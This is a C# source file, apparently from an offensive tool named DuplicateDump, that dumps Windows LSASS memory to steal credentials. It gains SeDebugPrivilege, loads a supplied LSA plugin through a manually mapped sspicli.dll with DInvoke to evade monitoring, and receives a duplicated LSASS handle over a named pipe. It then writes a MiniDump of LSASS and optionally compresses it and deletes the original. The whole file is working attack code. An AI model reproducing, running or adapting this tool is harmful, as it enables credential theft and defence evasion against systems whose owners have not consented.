using Mono.Options;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using static DuplicateDump.ProcessUtility;
using System.IO.Pipes;
using System.Text;
using DInvoke.Data;

namespace DuplicateDump{
    class Program {

        public static void GetSeDebugPrivs()
        {
            bool previous = false;
            Object[] rtlAdjustPrivilegeArgs = { 20, true, false, previous };
            Native.NTSTATUS status = (Native.NTSTATUS)DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke("ntdll.dll", "RtlAdjustPrivilege", typeof(Delegates.RtlAdjustPrivilege), ref rtlAdjustPrivilegeArgs);
            Console.WriteLine("[+] SeDebugPrivilege obtained");
        }
        static void LoadPlugin(string plugin)
        {
            NamedPipeServerStream pipeServer = null;

            try
            {
                String strPipeName = "7d872e921a4b4b1b8b295395099b0209";
                
                pipeServer = new NamedPipeServerStream(
                     strPipeName,                    // The unique pipe name.
                     PipeDirection.InOut,            // The pipe is bi-directional
                     NamedPipeServerStream.MaxAllowedServerInstances,
                     PipeTransmissionMode.Message,   // Message type pipe 
                     PipeOptions.Asynchronous
                     );
                
                //Console.WriteLine("[+] The named pipe \"{0}\" is created", strPipeName);
                //pipeServer.WaitForConnection();
                pipeServer.BeginWaitForConnection(new AsyncCallback(SendPid), pipeServer);

                Console.WriteLine("[+] Loading LSA security package");
                Structs.SECURITY_PACKAGE_OPTIONS spo = new Structs.SECURITY_PACKAGE_OPTIONS();
                Object[] addSecurityPackageArgs = { plugin, spo };
                DInvoke.Data.PE.PE_MANUAL_MAP sspicliModule = DInvoke.ManualMap.Map.MapModuleToMemory("C:\\Windows\\System32\\sspicli.dll");
                DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(sspicliModule.PEINFO, sspicliModule.ModuleBase, "AddSecurityPackageA", typeof(Delegates.AddSecurityPackage), addSecurityPackageArgs);
                
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] The server throws the error: {0}", ex.Message);
            }
            
        }
        static void SendPid(IAsyncResult iar)
        {
            
            try
            {
                Process currentProcess = Process.GetCurrentProcess();
                string cpid = currentProcess.Id.ToString();
                Console.WriteLine("[+] Named pipe connected and replying with current PID {0}", cpid);
                
                // Get the pipe
                NamedPipeServerStream pipeServer = (NamedPipeServerStream)iar.AsyncState;
                // End waiting for the connection
                pipeServer.EndWaitForConnection(iar);

                byte[] bReply;
                int cbReplyBytes;
                cpid += "\0";
                bReply = Encoding.Unicode.GetBytes(cpid);
                cbReplyBytes = bReply.Length;
                // Write the PID to the pipe.
                pipeServer.Write(bReply, 0, cbReplyBytes);
                
                pipeServer.Flush();
                pipeServer.Disconnect();
                pipeServer.Close();
                pipeServer = null;

            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Named pipe connection error: {0}", ex.Message);
            }
        }

        public static void Compress(string inFile, string outFile)
        {
            try
            {
                if (File.Exists(outFile))
                {
                    Console.WriteLine("[!] Output file '{0}' already exists, removing it", outFile);
                    File.Delete(outFile);
                }

                var bytes = File.ReadAllBytes(inFile);
                using (FileStream fs = new FileStream(outFile, FileMode.CreateNew))
                {
                    using (GZipStream zipStream = new GZipStream(fs, CompressionMode.Compress, false))
                    {
                        zipStream.Write(bytes, 0, bytes.Length);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Error occur while compressing file: {0}", ex.Message);
            }
        }

        public static void Minidump(IntPtr hLsass, string dumpFile, bool compress)
        {
            try
            {
                bool result = false;

                using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
                {
                    IntPtr minidumpPtr = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("Dbgcore.dll", "MiniDumpWriteDump", true);
                    //Set ProcessId (2nd arg) to 0 or own PID instead of LSASS's PID. Prevent MiniDumpWriteDump open its own handle to LSASS
                    Object[] minidumpArgs = { hLsass, (uint)0, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero };
                    result = (bool)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(minidumpPtr, typeof(Delegates.MiniDumpWriteDump), ref minidumpArgs);

                }

                // if successful
                if (result)
                {
                    //Console.WriteLine("[+] Dump successful!");
                    if (compress)
                    {
                        string zipFile = dumpFile + ".gz";
                        Compress(dumpFile, zipFile);
                        File.Delete(dumpFile);
                        Console.WriteLine("[+] Compressed dump file saved to {0}", zipFile);
                    }
                    else
                        Console.WriteLine("[+] Dump file saved to {0}", dumpFile);

                }
                else
                {
                    Console.WriteLine(String.Format("[X] Dump failed", result));
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Dump failed with error: {0}", ex.Message);
            }
            
        }
        static void Main(string[] args) {

            string fileName = "";
            bool showHelp = false;
            string plugin = "";
            bool isCompress = false;
            bool isDebugPriv = false;

            OptionSet option_set = new OptionSet()
                 .Add("f=|filename=", "The path to write the dump file to", v => fileName = v)
                 .Add("p=|plugin=", "Full file path to LSA plugin", v => plugin = v)
                 .Add("c|compress", "GZip and delete the dump file on disk", v => isCompress = true)
                 .Add("d|DebugPriv", "Obtain SeDebugPrivilege", v => isDebugPriv = true)
                 .Add("h|help", "Display this help", v => showHelp = v != null);

            try {

                option_set.Parse(args);

                if (fileName == "" || plugin == "")
                    showHelp = true;

                if (showHelp) {
                    option_set.WriteOptionDescriptions(Console.Out);
                    return;
                }

            } catch (Exception e) {
                Console.WriteLine("[!] Failed to parse arguments: {0}", e.Message);
                option_set.WriteOptionDescriptions(Console.Out);
                return;
            }

            if(isDebugPriv)
                GetSeDebugPrivs();

            //Load LSA plugin and wait for the duplicated handle to LSASS
            LoadPlugin(plugin);

            //Console.WriteLine("[+] Searching current process for duplicated LSASS handle");
            var procHandle = GetLsassHandle(Process.GetCurrentProcess());
            if(procHandle != null) {
                Console.WriteLine($"[+] Found duplicated LSASS process handle 0x{procHandle.Handle.ToInt64():x}");
            } else {
                Console.WriteLine($"[!] Failed to get LSASS handle!");
                return;
            }
            
            //Console.WriteLine("[+] Dumping LSASS memory");
            Minidump(procHandle.Handle, fileName, isCompress);

        }
    }
}
